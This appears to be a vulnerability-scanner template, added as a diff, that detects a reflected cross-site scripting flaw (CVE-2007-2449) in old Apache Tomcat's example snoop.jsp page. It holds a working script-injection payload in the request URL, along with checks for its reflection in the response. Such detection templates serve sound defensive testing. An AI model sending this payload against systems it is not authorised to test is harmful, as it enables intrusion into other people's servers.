@@ -1,0 +1,54 @@
+id: APACHE_OLD_TOMCAT_XSS
+info:
+  name: Apache Old Version Tomcat Cross-Site Scripting
+  description: "Apache Old Version Tomcat Cross-Site Scripting (XSS) vulnerabilities refer to security flaws in outdated versions of the Tomcat server, where improper input handling allows attackers to inject malicious scripts. These vulnerabilities can exploit weak sanitization mechanisms, leading to the execution of harmful scripts in users' browsers. This can result in session hijacking, data theft, or unauthorized actions. Updating to the latest versions and applying security patches are crucial to mitigating these risks."
+  details: "Apache Old Version Tomcat Cross-Site Scripting (XSS) vulnerabilities occur in legacy versions of the Tomcat server that lack robust input validation and output encoding mechanisms. Attackers can exploit these flaws by injecting malicious scripts into web applications hosted on Tomcat, which then execute in the browsers of users accessing those applications. This can lead to serious consequences, such as theft of session cookies, sensitive data exposure, or unauthorized actions performed by the attacker. Regular updates and adherence to secure coding practices are essential for mitigating these vulnerabilities."
+  impact: "The impact of Apache Old Version Tomcat Cross-Site Scripting (XSS) vulnerabilities can be severe, allowing attackers to inject scripts that execute in users' browsers. This can lead to session hijacking, where attackers gain unauthorized access to user accounts, as well as theft of sensitive information such as cookies or personal data. Additionally, such vulnerabilities can be exploited to carry out further attacks, potentially compromising the entire application and undermining user trust in the platform."
+  category:
+    name: XSS
+    shortName: XSS
+    displayName: Cross-site scripting (XSS)
+  subCategory: APACHE_OLD_TOMCAT_XSS
+  severity: LOW
+  references:
+    - "https://owasp.org/www-community/attacks/xss/"
+    - "https://hackerone.com/reports/840759"
+  cwe:
+    - CWE-79
+  cve:
+    - CVE-2007-2449
+
+api_selection_filters:
+  method:
+    neq: "OPTIONS"
+  response_code:
+    gte: 200
+    lt: 300
+  response_payload:
+    length:
+      gt: 0
+execute:
+  type: single
+  requests:
+    - req:
+      - modify_method: GET
+      - modify_url: "/examples/jsp/snp/snoop.jsp;<script>alert(document.domain)</script>test.jsp"
+      - replace_body: '{}'
+
+validate:
+  response_code:
+    eq: 200
+  response_payload:
+    length:
+      gt: 0
+    contains_all:
+      - "Request URI: /examples/jsp/snp/snoop.jsp;<script>alert(document.domain)</script>test.jsp"
+      - "JSP Request Method"
+  response_headers:
+    for_one:
+      key:
+        eq: "content-type"
+      value:
+        contains_either: "text/html"
+strategy:
+  run_once: /
